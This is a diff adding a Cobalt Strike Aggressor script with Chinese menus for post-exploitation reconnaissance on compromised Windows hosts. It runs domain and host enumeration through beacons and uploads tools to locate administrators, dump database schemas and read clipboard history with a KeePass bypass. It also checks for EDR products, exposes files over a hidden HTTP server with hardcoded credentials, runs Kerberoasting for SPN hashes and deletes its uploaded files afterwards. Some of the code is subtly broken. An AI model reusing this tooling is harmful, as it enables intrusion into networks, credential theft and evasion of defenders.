@@ -1,0 +1,660 @@
+menu "信息收集" {
+	menu "单机常用命令" {
+		item "systeminfo" {
+			$bid = $1['@'];
+			bshell($bid, "systeminfo");
+		}
+		item "whoami /all" {
+			$bid = $1['@'];
+			bshell($bid, "whoami /all");
+		}
+		item "ipconfig /all" {
+			$bid = $1['@'];
+			bshell($bid, "ipconfig /all");
+		}
+		item "查看路由表" {
+			$bid = $1['@'];
+			bshell($bid, "route print");
+		}
+		item "查看arp缓存" {
+			$bid = $1['@'];
+			bshell($bid, "arp -A");
+		}
+		item "查看用户信息" {
+			$bid = $1['@'];
+			bshell($bid, "net user");
+		}
+		item "查看安装程序和版本信息" {
+			$bid = $1['@'];
+			bshell($bid, "wmic product get name,version");
+		}
+		item "查看安装的补丁" {
+			$bid = $1['@'];
+			bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
+		}
+		item "查看运行的进程及路径" {
+			$bid = $1['@'];
+			bshell($bid, "wmic process get caption,executablepath,commandline");
+		}
+		item "查看进程详细信息" {
+			$bid = $1['@'];
+			bshell($bid, "wmic process get caption,commandline,processid /value");
+		}
+		item "查看服务" {
+			$bid = $1['@'];
+			bshell($bid, "wmic service list brief");
+		}
+		item "查看防火墙配置" {
+			$bid = $1['@'];
+			bshell($bid, "netsh firewall show config");
+		}
+		item "查看计划任务" {
+			$bid = $1['@'];
+			bshell($bid, "schtasks.exe");
+		}
+		item "查看计划任务详情" {
+			$bid = $1['@'];
+			bshell($bid, "schtasks /query /fo LIST /v");
+		}
+		item "查看启动程序信息" {
+			$bid = $1['@'];
+			bshell($bid, "wmic startup get command,caption");
+		}
+		item "查看在线用户" {
+			$bid = $1['@'];
+			bshell($bid, "query user || qwinsta");
+		}
+		item "查看开机时间" {
+			$bid = $1['@'];
+			bshell($bid, "net statistics workstation");
+		}
+		item "查看powershell v5历史命令" {
+			$bid = $1['@'];
+			bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
+		}
+		item "查看最近使用的项目" {
+			$bid = $1['@'];
+			bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
+		}
+		item "查看SMB指向路径" {
+			$bid = $1['@'];
+			bshell($bid, "wmic share get name,path");
+		}
+	}
+
+
+	menu "域环境常用命令" {
+		menu "AdFind(查询域内信息)" {
+			item "上传AdFind" {
+				$bid = $1;
+				$dialog = dialog("上传AdFind", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &AdFind_upload);
+				dialog_description($dialog,"AdFind用于查询域内信息。项目地址：http://www.joeware.net/freetools/tools/adfind/index.htm");
+				drow_text($dialog, "UploadPath",  "上传路径: ");
+				dbutton_action($dialog, "上传");
+				dialog_show($dialog);
+			}
+			sub AdFind_upload {
+				bcd($bid, $3['UploadPath']);
+				bupload($bid, script_resource("/scripts/InfoCollect/AdFind.exe"));
+			}
+			item "列出域控制器名称" {
+				$bid = $1['@'];
+				bshell($bid, "AdFind.exe -sc dclist");
+			}
+			item "查询当前域中在线的计算机" {
+				$bid = $1['@'];
+				bshell($bid, "AdFind.exe -sc computers_active");
+			}
+			item "查询当前域中在线的计算机(只显示名称和操作系统)" {
+				$bid = $1['@'];
+				bshell($bid, "AdFind.exe -sc computers_active name operatingSystem");
+			}
+			item "查询当前域中所有计算机" {
+				$bid = $1['@'];
+				bshell($bid, "AdFind.exe -f \"objectcategory=computer\"");
+			}
+			item "查询当前域中所有计算机(只显示名称和操作系统)" {
+				$bid = $1['@'];
+				bshell($bid, "AdFind.exe -f \"objectcategory=computer\" name operatingSystem");
+			}
+			item "查询域内所有用户" {
+				$bid = $1['@'];
+				bshell($bid, "AdFind.exe -users name");
+			}
+			item "查询所有GPO" {
+				$bid = $1['@'];
+				bshell($bid, "AdFind.exe -sc gpodmp");
+			}
+			item "删除AdFind" {
+				$bid = $1['@'];
+				bshell($bid, "del /f /s /q AdFind.exe");
+			}
+		}
+
+		item "查询域" {
+			$bid = $1['@'];
+			bshell($bid, "net view /domain");
+		}
+		item "查看域管" {
+			$bid = $1['@'];
+			bshell($bid, "net group \"domain admins\" /domain");
+		}
+		item "查看域用户详细信息" {
+			prompt_text("输入域用户名", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
+		}
+		item "查看当前登录域" {
+			$bid = $1['@'];
+			bshell($bid, "net config workstation");
+		}
+		item "查看时间服务器" {
+			$bid = $1['@'];
+			bshell($bid, "net time /domain");
+		}
+		item "显示当前域的计算机列表" {
+			$bid = $1['@'];
+			bshell($bid, "net view");
+		}
+		item "查看登录本机的域管" {
+			$bid = $1['@'];
+			bshell($bid, "net localgroup administrators /domain");
+		}
+		item "查看所有域用户" {
+			$bid = $1['@'];
+			bshell($bid, "net user /domain");
+		}
+		item "查看域内所有用户组列表" {
+			$bid = $1['@'];
+			bshell($bid, "net group /domain");
+		}
+		item "查看主域控制器" {
+			$bid = $1['@'];
+			bshell($bid, "netdom query pdc");
+		}
+		item "查看域控列表" {
+			$bid = $1['@'];
+			bshell($bid, "net group \"Domain Controllers\" /domain");
+		}
+		item "查看域控主机名" {
+			$bid = $1['@'];
+			bshell($bid, "Nslookup -type=SRV _ldap._tcp");
+		}
+		item "获取域信任信息" {
+			$bid = $1['@'];
+			bshell($bid, "nltest /domain_trusts");
+		}
+		item "获取域密码信息" {
+			$bid = $1['@'];
+			bshell($bid, "net accounts /domain");
+		}
+		item "查看所有域成员计算机列表" {
+			$bid = $1['@'];
+			bshell($bid, "net group \"domain computers\" /domain");
+		}
+		item "查看域内所有计算机" {
+			prompt_text("输入主机名", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
+		}
+
+	}
+
+
+	item "SharpChassisType(判断主机类型)" {
+		$bid = $1['@'];
+		$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
+		dialog_description($dialog,"用于判断当前机器类型(桌面计算机、笔记本等判断)。项目地址：https://github.com/RcoIl/CSharp-Tools/");
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpChassisType{
+	    bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpChassisType.exe"), "");
+	}
+
+
+	item "SharpEventLog(获取系统登录日志)" {
+		$bid = $1;
+		$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
+		dialog_description($dialog, "读取登录过本机的登录失败或登录成功（4624，4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。项目地址：https://github.com/uknowsec/SharpEventLog");
+		drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpEventLog {
+		bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpEventLog.exe"), $3['EventLogType']);
+	}
+
+	item "SharpCheckInfo(获取多项主机信息)" {
+		$bid = $1;
+		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
+		dialog_description($dialog, "收集目标主机信息，包括最近打开文件，系统环境变量和回收站文件等等。项目地址：https://github.com/uknowsec/SharpCheckInfo");
+		drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpCheckInfo {
+		bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpCheckInfo.exe"), $3['Type']);
+	}
+
+	item "SharpSQLDump(快速列出数据库数据)" {
+		$bid = $1['@'];
+		$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
+		dialog_description($dialog, "内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。项目地址：https://github.com/uknowsec/SharpSQLDump");
+		drow_text($dialog, "host", "host:  ");
+		drow_text($dialog, "username", "username:  ");
+		drow_text($dialog, "password", "password:  ");
+		drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpSQLDump {
+		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
+		bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpSQLDump.exe"), $arg);
+	}
+
+	item "SharpClipHistory(获取win10剪切板)" {
+		$bid = $1;
+		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
+		dialog_description($dialog, "可用于从1809 Build版本开始读取Windows 10中用户剪贴板历史记录的内容。空白类型选项表示读取。项目地址：https://github.com/FSecureLABS/SharpClipHistory");
+		drow_combobox($dialog, "Type", "Type:", @("--help","","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpClipHistory {
+		bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpClipHistory.exe"), $3['Type']);
+	}
+
+	item "SharpAVKB(杀软和补丁对比)" {
+		$bid = $1;
+		$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
+		dialog_description($dialog, "Windows杀软对比和补丁号对比。项目地址：https://github.com/uknowsec/SharpAVKB");
+		drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpAVKB {
+		bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpAVKB.exe"), $3['type']);
+	}
+
+	item "SharpEDRChecker(获取EDR信息)" {
+		$bid = $1['@'];
+		btask($bid, "检查正在运行的进程，进程元数据，加载到当前进程中的Dll以及每个DLL元数据，通用安装目录，已安装的服务和每个服务二进制元数据，已安装的驱动程序和每个驱动程序元数据，所有这些都存在已知的防御性产品，例如AV，EDR和日志记录工具。还可以通过其元数据检查来捕获隐藏的EDR。项目地址：https://github.com/PwnDexter/SharpEDRChecker", "");
+		bexecute_assembly($1, script_resource("/scripts/InfoCollect/SharpEDRChecker.exe"), "");
+	}
+
+	item "SharpDir(文件搜索)" {
+		$bid = $1['@'];
+		$dialog = dialog("文件搜索", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
+		dialog_description($dialog, "文件搜索，三种搜索方式，指定文件名、制定文件名搜索后缀、搜索指定后缀文件。项目地址：https://github.com/jnqpblc/SharpDir");
+		drow_text($dialog, "path", "path:  ");
+		drow_text($dialog, "file", "file:  ");
+		dbutton_action($dialog, "运行");
+		dialog_show($dialog);
+	}
+	sub SharpDir {
+		$arg = join(' ', @($3['path'],$3['file']));
+		bexecute_assembly($bid, script_resource("/scripts/InfoCollect/SharpDir.exe"), $arg);
+	}
+
+	menu "Everything(建立http服务文件搜索)" {
+		item "上传Everything" {
+			$bid = $1;
+			$dialog = dialog("上传 Everything", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &evething);
+			dialog_description($dialog, "运行无任何弹窗，软件地址：https://www.voidtools.com/zh-cn/");
+			drow_text($dialog, "UploadPath",  "上传路径: ");
+			dbutton_action($dialog, "上传");
+			dialog_show($dialog);
+		}
+		sub evething {
+            bcd($bid, $3['UploadPath']);
+            bupload($bid, script_resource("/scripts/InfoCollect/everything/Everything.exe"));
+            bupload($bid, script_resource("/scripts/InfoCollect/everything/Everything.ini"));
+        }
+
+		item "运行Everything"{
+			$bid = $1['@'];
+			$Dialog = dialog("运行Evething",%(bid => $bid),&Evething_run);
+			dialog_description($Dialog, "运行无任何弹窗及托盘显示，自动启用http服务。端口：65535，用户：admin，密码：admin@123");
+			btask($bid, "运行无任何弹窗及托盘显示，自动启用http服务。访问web服务：http://ip:65535，用户：admin，密码：admin@123", "");
+			dbutton_action($Dialog, "运行");
+			dialog_show($Dialog);
+		}
+		sub Evething_run{
+			bshell($bid, "Everything.exe");
+		}
+		item "停止Everything"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im Everything.exe");
+			}
+		}
+		item "删除Everything"{
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini");
+			}
+		}
+	}
+
+	sub moduleimport{
+		foreach $bid ($1){
+			blog($bid, "导入脚本: $modulename");
+			bpowershell_import($bid, script_resource($modulename));
+		}
+	}
+
+	sub getuser{
+		bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -Identity \"$3['username']\"");
+	}
+
+	sub groupquery{
+		bpowershell($bid, "Import-Module .\\AD.dll;Get-ADGroupMember \'$3['groupname']\' | Select-Object name,objectClass,distinguishedName,SID | fl");
+	}
+
+	sub spnuserquery{
+		bpowershell($bid, "Import-Module .\\AD.dll;Invoke-Kerberoast -Identity \'$3['spnusername']\' | %{\$_.hash}");
+	}
+	menu "Netview" {
+		item "上传netview" {
+		$bid = $1;
+		$dialog = dialog("上传netview", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &netview);
+		dialog_description($dialog, "绝大部分功能不需要管理员权限。项目地址：https://github.com/mubix/netview");
+		drow_text($dialog, "UploadPath",  "上传路径: ");
+		dbutton_action($dialog, "上传");
+		dialog_show($dialog);
+		}
+		sub netview {
+		bcd($bid, $3['UploadPath']);
+		bupload($bid, script_resource("/scripts/InfoCollect/netview.exe"));
+		}
+		item "运行netview"{
+		$bid = $1['@'];
+		$Dialog = dialog("运行netview",%(domain => "xxx.com",bid => $bid),&netview_run);
+		drow_text($Dialog, "domain", "domain: ");
+		dbutton_action($Dialog, "运行");
+		dialog_show($Dialog);
+		}
+		sub netview_run{
+		local('$Name');
+		$Name = $3['domain'];
+		bshell($bid, "netview.exe   $+ $Name");
+		}
+		item "删除netview"{
+		local('$bid');
+		foreach $bid ($1){
+			bshell($1, "del /f /s /q netview.exe");
+		}
+		}
+	}
+	menu "Powerview 2008查询"{
+		item "上传AD模块"{
+			bupload($bid, script_resource("/scripts/InfoCollect/AD.dll"));
+		}
+		item "导入Powerview"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				blog2($bid, "powerview导入测试");
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-DomainController");
+			}
+		}
+		item "查看指定的用户信息"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("查看指定用户", %(username => ""), &getuser);
+				dialog_description($dialog, "powerview查看指定用户的信息");
+				drow_text($dialog, "username", "用户: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+		}
+
+		item "所有用户最后一个错误的密码尝试"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "
+Import-Module .\\AD.dll;get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto");
+			}
+		}
+
+
+		item "查询某个组的用户"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("查看指定组的所有用户", %(groupname => ""), &groupquery);
+				dialog_description($dialog, "powerview查看指定组的所有用户");
+				drow_text($dialog, "groupname", "组名: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+
+		}
+
+		item "域控机器查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADDomainController -filter * | Select-Object HostName,IPv4Address,OperatingSystem | fl");
+			}
+		}
+
+		item "获取域级别"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADDomain | Select-Object DNSRoot,PDCEmulator,DomainMode");
+			}
+		}
+
+		item "寻找域内所有计算机和计算机对应的DNS"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADComputer -Filter * -Property Name,IPv4Address | Select-Object DNSHostName,IPv4Address,SID | fl");
+			}
+		}
+
+		item "寻找域内所有用户"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -Filter * | Select-Object Name,ObjectClass,SID | fl");
+			}
+		}
+
+		item "寻找kerberos服务用户"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -filter {ServicePrincipalName -like \"*\"} -Property * | Select-Object Name,SID,ServicePrincipalNames | fl");
+			}
+		}
+
+		item "无委派计算机查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADComputer -Filter {TrustedForDelegation -eq \$True} -Properties * | select-object DNSHostName,IPv4Address,KerberosEncryptionType,whenCreated | fl");
+			}
+		}
+
+		item "约束委派用户查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-ADUser -Filter {TrustedToAuthForDelegation -eq \$True} -Properties * | select-object DistinguishedName,servicePrincipalName,msDS-AllowedToDelegateTo");
+			}
+		}
+
+		item "域用户不要求kerberos验证身份查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($pid, "Import-Module .\\AD.dll;Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$False} | Select-Object Name,SID | fl");
+			}
+		}
+
+		item "获取指定SPN用户的hash"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("获取指定SPN用户的hash", %(spnusername => ""), &spnuserquery);
+				dialog_description($dialog, "powerview获取指定SPN用户的hash");
+				drow_text($dialog, "spnusername", "用户: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+		}
+
+		item "枚举有价值(高权限组)的SPN用户"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Import-Module .\\AD.dll;Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon");
+			}
+
+		}
+	}
+
+	sub moduleimport12{
+		foreach $bid ($1){
+			blog($bid, "导入脚本: $modulename");
+			bpowershell_import($bid, script_resource($modulename));
+		}
+	}
+
+	sub getuser{
+		bpowershell($bid, "Get-ADUser -Identity \"$3['username']\"");
+	}
+
+	sub groupquery{
+		bpowershell($bid, "Get-ADGroupMember \'$3['groupname']\' | Select-Object name,objectClass,distinguishedName,SID | fl");
+	}
+
+	sub spnuserquery{
+		bpowershell($bid, "Invoke-Kerberoast -Identity \'$3['spnusername']\' | %{\$_.hash}");
+	}
+
+
+	menu "Powerview 2012查询"{
+		item "导入Powerview"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				blog2($bid, "powerview导入测试");
+				bpowershell($bid, "Get-DomainController");
+			}
+		}
+		item "查看指定的用户信息"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("查看指定用户", %(username => ""), &getuser);
+				dialog_description($dialog, "powerview查看指定用户的信息");
+				drow_text($dialog, "username", "用户: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+		}
+
+		item "所有用户最后一个错误的密码尝试"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "
+get-aduser -filter * -prop lastbadpasswordattempt,badpwdcount | select name,lastbadpasswordattempt,badpwdcount | format-table -auto");
+			}
+		}
+
+
+		item "查询某个组的用户"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("查看指定组的所有用户", %(groupname => ""), &groupquery);
+				dialog_description($dialog, "powerview查看指定组的所有用户");
+				drow_text($dialog, "groupname", "组名: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+
+		}
+
+		item "域控机器查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADDomainController -filter * | Select-Object HostName,IPv4Address,OperatingSystem | fl");
+			}
+		}
+
+		item "获取域级别"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADDomain | Select-Object DNSRoot,PDCEmulator,DomainMode");
+			}
+		}
+
+		item "寻找域内所有计算机和计算机对应的DNS"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADComputer -Filter * -Property Name,IPv4Address | Select-Object DNSHostName,IPv4Address,SID | fl");
+			}
+		}
+
+		item "寻找域内所有用户"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADUser -Filter * | Select-Object Name,ObjectClass,SID | fl");
+			}
+		}
+
+		item "寻找kerberos服务用户"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADUser -filter {ServicePrincipalName -like \"*\"} -Property * | Select-Object Name,SID,ServicePrincipalNames | fl");
+			}
+		}
+
+		item "无委派计算机查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADComputer -Filter {TrustedForDelegation -eq \$True} -Properties * | select-object DNSHostName,IPv4Address,KerberosEncryptionType,whenCreated | fl");
+			}
+		}
+
+		item "约束委派用户查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($bid, "Get-ADUser -Filter {TrustedToAuthForDelegation -eq \$True} -Properties * | select-object DistinguishedName,servicePrincipalName,msDS-AllowedToDelegateTo");
+			}
+		}
+
+		item "域用户不要求kerberos验证身份查询"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				bpowershell($pid, "Get-ADUser -Filter {DoesNotRequirePreAuth -eq \$False} | Select-Object Name,SID | fl");
+			}
+		}
+
+		item "获取指定SPN用户的hash"{
+			$modulename = "/scripts/InfoCollect/Powerview.ps1";
+			moduleimport12($1, $modulename);
+			foreach $bid ($1){
+				$dialog = dialog("获取指定SPN用户的hash", %(spnusername => ""), &spnuserquery);
+				dialog_description($dialog, "powerview获取指定SPN用户的hash");
+				drow_text($dialog, "spnusername", "用户: ");
+				dbutton_action($dialog, "QUERY");
+				dialog_show($dialog);
+			}
+		}
+	}
+
+}
